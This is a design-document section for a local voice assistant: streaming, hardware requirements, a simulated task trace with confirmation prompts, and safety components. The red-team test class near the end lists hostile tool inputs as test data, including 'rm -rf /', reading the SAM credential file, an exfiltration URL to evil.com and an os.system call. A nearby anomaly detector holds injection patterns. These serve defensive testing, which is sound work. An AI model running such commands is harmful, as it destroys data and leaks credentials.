# Part 5 — Performance Optimization, Hardware Requirements, Full Execution Simulation, and Advanced Enhancements

---

## §14 Performance Optimization

### 14.1 Token Streaming

LLM responses stream via Ollama's `stream=true` parameter. The response generator begins processing partial JSON as tokens arrive:

```python
class StreamingResponseProcessor:
    async def process_stream(self, ollama_stream) -> AsyncIterator[str]:
        buffer = ""
        async for chunk in ollama_stream:
            token = chunk["message"]["content"]
            buffer += token

            # Attempt incremental JSON parse for early tool call extraction
            if buffer.count("{") == buffer.count("}") and buffer.strip().endswith("}"):
                try:
                    parsed = json.loads(buffer)
                    yield parsed
                except json.JSONDecodeError:
                    continue
```

### 14.2 Streaming TTS Playback

Piper TTS supports streaming synthesis — audio chunks are played as they are generated, not after full synthesis completes:

```python
class StreamingTTS:
    def __init__(self, model_path: str, sample_rate: int = 22050):
        self.process = None
        self.sample_rate = sample_rate
        self.model_path = model_path

    async def speak(self, text: str):
        # Sentence-level chunking for streaming
        sentences = self._split_sentences(text)

        for sentence in sentences:
            audio_chunk = await self._synthesize_chunk(sentence)
            await self._play_audio(audio_chunk)

    async def _synthesize_chunk(self, text: str) -> np.ndarray:
        proc = await asyncio.create_subprocess_exec(
            "piper", "--model", self.model_path,
            "--output-raw", "--sentence_silence", "0.2",
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE
        )
        stdout, _ = await proc.communicate(input=text.encode("utf-8"))
        return np.frombuffer(stdout, dtype=np.int16)

    async def _play_audio(self, audio: np.ndarray):
        import sounddevice as sd
        event = asyncio.Event()
        def callback(outdata, frames, time_info, status):
            pass
        sd.play(audio, samplerate=self.sample_rate, blocking=False)
        await asyncio.sleep(len(audio) / self.sample_rate)

    def _split_sentences(self, text: str) -> list[str]:
        import re
        return [s.strip() for s in re.split(r'(?<=[.!?])\s+', text) if s.strip()]
```

### 14.3 Lazy Module Loading

```python
class LazyLoader:
    """Defer heavy imports until first use."""
    _modules = {}

    @classmethod
    def get(cls, module_name: str):
        if module_name not in cls._modules:
            import importlib
            cls._modules[module_name] = importlib.import_module(module_name)
        return cls._modules[module_name]

# Usage — Faster-Whisper loaded only when first transcription requested
whisper = LazyLoader.get("faster_whisper")
```

### 14.4 GPU Acceleration Strategy

```python
GPU_CONFIG = {
    "cuda_available": torch.cuda.is_available(),
    "vram_total_mb": torch.cuda.get_device_properties(0).total_memory // (1024*1024)
        if torch.cuda.is_available() else 0,

    # Model placement strategy based on available VRAM
    "placement": {
        "8GB+": {
            "llm": "gpu",           # Ollama handles this internally
            "stt": "gpu",           # faster-whisper CUDA
            "embeddings": "gpu",    # sentence-transformers CUDA
            "vad": "cpu",           # too small to benefit from GPU
            "wake_word": "cpu",     # must run on CPU for low latency
            "tts": "cpu"            # Piper uses CPU (ONNX)
        },
        "4-8GB": {
            "llm": "gpu",
            "stt": "cpu",           # offload STT to free VRAM for LLM
            "embeddings": "cpu",
            "vad": "cpu",
            "wake_word": "cpu",
            "tts": "cpu"
        },
        "0-4GB": {
            # CPU-only mode
            "llm": "cpu", "stt": "cpu", "embeddings": "cpu",
            "vad": "cpu", "wake_word": "cpu", "tts": "cpu"
        }
    }
}
```

### 14.5 Core Affinity Tuning

```python
CORE_AFFINITY_MAP = {
    "audio_capture": [0],           # Dedicated core for real-time audio
    "wake_word": [1],               # Dedicated core for wake word
    "main_event_loop": [2, 3],      # Main asyncio loop
    "stt_inference": [4, 5],        # STT can use 2 cores
    "llm_inference": "all",         # Ollama manages its own threading
    "background_tasks": [6, 7],     # Memory compaction, logging flush
}
```

### 14.6 Background Memory Compaction

```python
async def memory_compaction_loop(memory: LongTermMemory, interval_hours: int = 6):
    """
    Periodically compact similar memories to reduce storage and improve retrieval.
    Merges semantically similar entries (cosine distance < 0.1) into a single summary.
    """
    while True:
        await asyncio.sleep(interval_hours * 3600)

        all_entries = memory.get_all()
        clusters = cluster_by_similarity(all_entries, threshold=0.1)

        for cluster in clusters:
            if len(cluster) > 1:
                merged_content = await summarize_cluster(cluster)
                merged_entry = MemoryEntry(
                    content=merged_content,
                    importance=max(e.importance for e in cluster),
                    entry_type=cluster[0].entry_type
                )
                memory.store(merged_entry)
                memory.delete_batch([e.id for e in cluster])
```

---

## §15 Hardware Requirements

### 15.1 Minimum Viable System (CPU-only)

| Component | Specification |
|---|---|
| CPU | 8-core x86_64 (Intel i5-12400 / AMD Ryzen 5 5600) |
| RAM | 16 GB DDR4 |
| Storage | 20 GB SSD (models + ChromaDB + logs) |
| GPU | None (CPU inference) |
| Microphone | USB or built-in, 16kHz capable |
| OS | Windows 10/11, Ubuntu 22.04+, macOS 13+ |

**Expected Latency (CPU-only):**
- Wake word: <50ms
- STT (base.en): ~2s for 5s audio
- LLM (Llama 3.1 8B Q4): ~8-15s first token, ~20 tok/s
- TTS: ~500ms first chunk
- **End-to-end: 12-20s**

### 15.2 Recommended CPU System

| Component | Specification |
|---|---|
| CPU | 12-core (Intel i7-13700 / AMD Ryzen 7 7700X) |
| RAM | 32 GB DDR5 |
| Storage | 50 GB NVMe SSD |
| GPU | NVIDIA RTX 3060 (12GB VRAM) |

**Expected Latency:**
- Wake word: <30ms
- STT (base.en, CUDA): ~300ms for 5s audio
- LLM (Llama 3.1 8B Q4, GPU): ~1s first token, ~60 tok/s
- TTS: ~200ms first chunk
- **End-to-end: 3-5s**

### 15.3 Recommended GPU System

| Component | Specification |
|---|---|
| CPU | 16-core |
| RAM | 64 GB DDR5 |
| GPU | NVIDIA RTX 4080 (16GB VRAM) or RTX 4090 (24GB VRAM) |
| Storage | 100 GB NVMe SSD |

**Expected Latency:**
- STT (small.en, CUDA, INT8): ~150ms
- LLM (Llama 3.1 8B Q4, GPU): ~500ms first token, ~100 tok/s
- Concurrent LLM + STT on same GPU
- **End-to-end: 1.5-3s**

### 15.4 Apple Silicon Configuration

| Component | Specification |
|---|---|
| Chip | M2 Pro / M3 Pro or higher |
| Unified Memory | 32 GB+ |
| Storage | 50 GB+ SSD |

Ollama natively supports Metal acceleration. Faster-Whisper uses CoreML via CTranslate2.

---

## §16 Full Execution Simulation

**User utterance:** *"Hey Jarvis, delete all temporary files, reorganize my desktop, and send the summary to Mark."*

### Stage 1: Wake Detection
```
[00.000s] WakeWordEngine: keyword="jarvis" detected, confidence=0.94
[00.010s] EventBus → audio.wake_detected
[00.012s] StateMachine: IDLE → LISTENING
[00.013s] SpeechCollector: started with 500ms pre-roll
```

### Stage 2: Speech Collection and STT
```
[00.013s–03.200s] SpeechCollector: accumulating frames
[03.200s] VAD: silence_duration=1600ms > threshold=1500ms → end_of_speech
[03.210s] EventBus → audio.speech_segment (3.2s audio)
[03.210s] StateMachine: LISTENING → TRANSCRIBING
[03.220s] Faster-Whisper (base.en, INT8, CUDA):
          Output: "delete all temporary files, reorganize my desktop, and send the summary to Mark"
          Confidence: 0.89
          Duration: 340ms
[03.560s] EventBus → stt.transcript
[03.560s] StateMachine: TRANSCRIBING → REASONING
```

### Stage 3: Memory Retrieval
```
[03.570s] ChromaDB query: "delete temporary files reorganize desktop send summary Mark"
          Retrieved memories:
          [FACT] Mark's email: mark.wilson@company.com (distance: 0.23)
          [PREFERENCE] Desktop organization: folders by file type (distance: 0.41)
          [FACT] Temp directories: %TEMP%, ~/AppData/Local/Temp (distance: 0.38)
```

### Stage 4: LLM Planning
```
[03.600s] Ollama POST /api/chat (stream=true)
          Model: llama3.1:8b-instruct-q4_K_M
          System prompt injected with tools + memory context

[04.100s] First token received (500ms TTFT)

[05.800s] Complete JSON parsed:
{
    "thought": "User wants three actions: (1) delete temp files — this is destructive and requires
    confirmation, (2) reorganize desktop by file type per user preference, (3) send summary email
    to Mark at mark.wilson@company.com. Steps 1 and 2 are filesystem ops; step 3 requires
    composing and sending an email.",
    "confidence": 0.85,
    "actions": [
        {
            "tool": "search_files",
            "args": {"pattern": "*", "directory": "C:\\Users\\Jigar Patel\\AppData\\Local\\Temp"},
            "requires_confirmation": false
        },
        {
            "tool": "file_delete",
            "args": {"path": "C:\\Users\\Jigar Patel\\AppData\\Local\\Temp", "recursive": true},
            "requires_confirmation": true,
            "depends_on": 0
        },
        {
            "tool": "search_files",
            "args": {"pattern": "*", "directory": "C:\\Users\\Jigar Patel\\Desktop"},
            "requires_confirmation": false
        },
        {
            "tool": "execute_code",
            "args": {
                "language": "python",
                "code": "# reorganize desktop files by extension\nimport shutil\nfrom pathlib import Path\n..."
            },
            "requires_confirmation": true,
            "depends_on": 2
        },
        {
            "tool": "browser_navigate",
            "args": {"url": "mailto:mark.wilson@company.com?subject=Desktop+Cleanup+Summary"},
            "requires_confirmation": true,
            "depends_on": 3
        }
    ]
}
```

### Stage 5: Self-Critique
```
[05.850s] Self-critique invoked:
          Result: {"approved": true, "issues": ["Email action via mailto is limited; consider
          dedicated email tool for production"], "revised_actions": null}
```

### Stage 6: Risk Classification
```
[05.900s] Action 0 (search_files): Heuristic=0.0 → TIER_1 → auto-execute
[05.910s] Action 1 (file_delete, recursive=true):
          Heuristic: recursive_operation(0.5) + deletion_operation(0.7) + bulk_scope(0.4) = 0.7
          → TIER_3 (immediate, no LLM assessment needed)
[05.920s] Action 2 (search_files): TIER_1 → auto-execute
[05.930s] Action 3 (execute_code): Heuristic=0.4 → ambiguous, invoke LLM risk assessment
          LLM risk: 0.55 ("reorganization moves files, moderate risk") → TIER_3
[05.940s] Action 4 (browser_navigate, mailto): Heuristic=0.6 (send pattern) → TIER_3
```

### Stage 7: Execution with Confirmations
```
[06.000s] === Step 0: search_files (TIER_1) — auto-execute ===
          Found 2,347 files in Temp directory (450MB total)
          Result logged.

[06.500s] === Step 1: file_delete (TIER_3) — confirmation required ===
[06.510s] StateMachine: EXECUTING → AWAITING_CONFIRM
[06.520s] TTS: "I'm about to permanently delete 2,347 temporary files totaling 450 megabytes
          from your Temp directory. This is a critical operation."
[08.100s] TTS: "Do you confirm? Say 'yes' to proceed or 'no' to cancel."
[08.200s] Listening for confirmation (15s timeout)...
[09.300s] STT: "yes go ahead" → normalized: "yes go ahead"
          Matched CONFIRM_PHRASES: {"yes", "go ahead"}
          No DENY_PHRASES matched.
          → CONFIRMED
[09.400s] send2trash("C:\\Users\\Jigar Patel\\AppData\\Local\\Temp\\*")
          Deleted 2,347 files (sent to Recycle Bin)
[10.200s] StateMachine: AWAITING_CONFIRM → EXECUTING

[10.300s] === Step 2: search_files (TIER_1) — auto-execute ===
          Found 45 files on Desktop.

[10.500s] === Step 3: execute_code (TIER_3) — confirmation required ===
[10.510s] TTS: "I will reorganize 45 files on your desktop into folders by file type:
          Documents, Images, Code, and Other."
[12.100s] TTS: "Do you confirm?"
[13.200s] STT: "yes"
          → CONFIRMED
[13.300s] Docker sandbox execution:
          - Mounted Desktop read-write
          - Created folders: Documents/, Images/, Code/, Other/
          - Moved 45 files
          - Exit code: 0
[15.100s] Result: 45 files reorganized into 4 folders.

[15.200s] === Step 4: browser_navigate mailto (TIER_3) — confirmation required ===
[15.210s] TTS: "I will open an email to mark.wilson@company.com with a summary of the
          cleanup. This sends data externally."
[17.000s] TTS: "Do you confirm?"
[18.100s] STT: "yes send it"
          → CONFIRMED
[18.200s] Browser opens mailto link with summary body.
[19.000s] Result: Email compose window opened.
```

### Stage 8: Logging and Memory Update
```
[19.100s] AuditLog: 5 entries recorded (3 TIER_3 confirmations, 2 TIER_1 auto-exec)
[19.200s] ExecutionTrace: full trace serialized to logs/traces/
[19.300s] Memory updates:
          - TASK_OUTCOME: "Cleaned 2347 temp files, reorganized 45 desktop files into 4 folders,
            initiated email summary to Mark" (importance: 0.8)
          - FACT: "Last desktop cleanup: 2026-02-17" (importance: 0.6)
```

### Stage 9: Spoken Response
```
[19.400s] ResponseGenerator: "Done. I deleted 2,347 temporary files, reorganized your desktop
          into Documents, Images, Code, and Other folders, and opened an email to Mark with the
          summary."
[19.450s] TTS streaming playback begins.
[21.500s] Playback complete.
[21.510s] StateMachine: RESPONDING → IDLE
```

**Total end-to-end time: ~21.5 seconds** (dominated by 3 confirmation dialogues at ~3s each)

---

## §17 Advanced Enhancements

### 17.1 Watchdog Supervisor Process

Detailed in §2.6. Additional details:

```python
class AdvancedWatchdog:
    HEARTBEAT_FILE = "state/heartbeat"
    MAX_HEARTBEAT_AGE_SECONDS = 15
    RESOURCE_THRESHOLDS = {
        "cpu_percent": 95.0,
        "memory_percent": 90.0,
        "disk_percent": 95.0
    }

    def check_heartbeat(self) -> bool:
        try:
            mtime = os.path.getmtime(self.HEARTBEAT_FILE)
            return (time.time() - mtime) < self.MAX_HEARTBEAT_AGE_SECONDS
        except FileNotFoundError:
            return False

    def check_resource_exhaustion(self) -> bool:
        cpu = psutil.cpu_percent(interval=1)
        mem = psutil.virtual_memory().percent
        disk = psutil.disk_usage("/").percent
        return (cpu > self.RESOURCE_THRESHOLDS["cpu_percent"]
                or mem > self.RESOURCE_THRESHOLDS["memory_percent"]
                or disk > self.RESOURCE_THRESHOLDS["disk_percent"])
```

### 17.2 Self-Health Diagnostics

```python
class HealthDiagnostics:
    async def full_check(self) -> HealthReport:
        checks = await asyncio.gather(
            self._check_ollama(),
            self._check_chromadb(),
            self._check_audio(),
            self._check_docker(),
            self._check_disk_space(),
            return_exceptions=True
        )
        return HealthReport(
            ollama=checks[0], chromadb=checks[1], audio=checks[2],
            docker=checks[3], disk=checks[4],
            overall="healthy" if all(
                isinstance(c, HealthCheck) and c.ok for c in checks
            ) else "degraded"
        )

    async def _check_ollama(self) -> HealthCheck:
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get("http://localhost:11434/api/tags", timeout=5) as r:
                    return HealthCheck(ok=r.status == 200, latency_ms=(time.time()-start)*1000)
        except Exception as e:
            return HealthCheck(ok=False, error=str(e))
```

### 17.3 Safe-Mode Fallback

When degraded health is detected, the system enters safe mode:

```python
class SafeMode:
    """
    In safe mode:
    - All tool calls are elevated to TIER_3 (require confirmation)
    - Code execution sandbox is disabled
    - Browser automation is disabled
    - Only file_read, search_files, and system_info are available
    - TTS announces: "I'm running in safe mode due to system issues."
    """
    SAFE_TOOLS = {"file_read", "search_files", "system_info"}

    def filter_tools(self, tool_schemas: list) -> list:
        return [t for t in tool_schemas if t["name"] in self.SAFE_TOOLS]
```

### 17.4 Automatic Rollback for Failed Bulk Operations

```python
class RollbackManager:
    def __init__(self):
        self.operations: list[RollbackEntry] = []

    def record(self, operation: str, original_state: dict, new_state: dict):
        self.operations.append(RollbackEntry(
            operation=operation,
            original_state=original_state,
            new_state=new_state,
            timestamp=time.time()
        ))

    async def rollback_last_n(self, n: int):
        for entry in reversed(self.operations[-n:]):
            await self._reverse(entry)

    async def _reverse(self, entry: RollbackEntry):
        match entry.operation:
            case "file_move":
                shutil.move(entry.new_state["path"], entry.original_state["path"])
            case "file_write":
                Path(entry.new_state["path"]).write_text(entry.original_state["content"])
            case "file_delete":
                pass  # send2trash is already recoverable via Recycle Bin
```

### 17.5 Dynamic Tool Registry

```python
class DynamicToolRegistry:
    def __init__(self):
        self.tools: dict[str, ToolDefinition] = {}

    def register(self, tool: ToolDefinition):
        self.tools[tool.name] = tool
        self._regenerate_llm_schema()

    def unregister(self, tool_name: str):
        del self.tools[tool_name]
        self._regenerate_llm_schema()

    def load_plugin(self, plugin_path: str):
        """Load a tool plugin from a Python module."""
        spec = importlib.util.spec_from_file_location("plugin", plugin_path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        for tool in module.TOOLS:
            self.register(tool)
```

### 17.6 Behavior Anomaly Detection

```python
class AnomalyDetector:
    """Detects unusual patterns that may indicate prompt injection or model misbehavior."""

    ANOMALY_RULES = [
        ("excessive_tool_calls", lambda plan: len(plan.actions) > 10),
        ("self_referential", lambda plan: any("jarvis" in a.args.get("code","").lower()
                                              for a in plan.actions)),
        ("repeated_destructive", lambda plan: sum(1 for a in plan.actions
                                                   if a.tool_name == "file_delete") > 3),
        ("path_traversal", lambda plan: any(".." in json.dumps(a.args)
                                            for a in plan.actions)),
        ("encoded_payload", lambda plan: any(
            re.search(r"base64|\\x[0-9a-f]{2}|eval\(", json.dumps(a.args))
            for a in plan.actions)),
    ]

    def check(self, plan: Plan) -> list[Anomaly]:
        anomalies = []
        for name, rule in self.ANOMALY_RULES:
            if rule(plan):
                anomalies.append(Anomaly(name=name, severity="high"))
        return anomalies
```

### 17.7 Adaptive Latency Optimization

```python
class LatencyOptimizer:
    """Tracks latency per component and adapts model selection dynamically."""

    def __init__(self):
        self.latency_history: dict[str, deque] = defaultdict(lambda: deque(maxlen=100))

    def record(self, component: str, latency_ms: float):
        self.latency_history[component].append(latency_ms)

    def should_downgrade_stt(self) -> bool:
        avg = np.mean(self.latency_history["stt"])
        return avg > 3000  # if STT averages over 3s, switch to tiny model

    def should_disable_self_critique(self) -> bool:
        avg = np.mean(self.latency_history["llm"])
        return avg > 10000  # if LLM averages over 10s, skip self-critique
```

### 17.8 Red-Team Adversarial Testing Layer

```python
class RedTeamTester:
    """
    Automated adversarial tests that run on system startup and periodically.
    Validates that safety mechanisms correctly block malicious inputs.
    """

    ADVERSARIAL_INPUTS = [
        # Prompt injection via tool args
        {"tool": "file_read", "args": {"path": "C:\\Windows\\System32\\config\\SAM"}},
        # Path traversal
        {"tool": "file_write", "args": {"path": "../../etc/passwd", "content": "pwned"}},
        # Excessive privilege
        {"tool": "execute_code", "args": {"language": "bash", "code": "rm -rf /"}},
        # Data exfiltration
        {"tool": "browser_navigate", "args": {"url": "https://evil.com/exfil?data=..."}},
        # Encoded payload
        {"tool": "execute_code", "args": {"language": "python",
            "code": "__import__('os').system('whoami')"}},
    ]

    async def run_all(self, validator: ToolCallValidator, risk_classifier: RiskClassifier):
        results = []
        for test_input in self.ADVERSARIAL_INPUTS:
            try:
                validated = validator.validate(test_input["tool"], test_input["args"])
                risk = risk_classifier.classify(validated)
                blocked = risk.tier == RiskTier.TIER_3
            except (PathViolationError, CodeSafetyViolation, UnknownToolError):
                blocked = True

            results.append(RedTeamResult(
                input=test_input,
                blocked=blocked,
                expected_blocked=True,
                passed=blocked == True
            ))

        failures = [r for r in results if not r.passed]
        if failures:
            raise SecurityTestFailure(
                f"{len(failures)} adversarial tests FAILED. System is NOT safe to run."
            )
```
